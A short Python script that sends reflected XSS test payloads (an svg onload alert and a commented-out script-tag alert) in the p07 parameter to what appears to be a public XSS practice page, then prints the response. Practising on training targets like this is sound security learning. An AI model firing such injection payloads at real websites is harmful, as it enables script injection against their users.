#!/usr/bin/python3
import requests

url = 'https://brutelogic.com.br/gym.php'

# payload = "'><script>alert(1+2)</script>"
payload = "'><svg/onload=alert(1+1)>"

params = {'p07': payload}

r = requests.get(url, params=params)

print(r.text)
print(r.url)
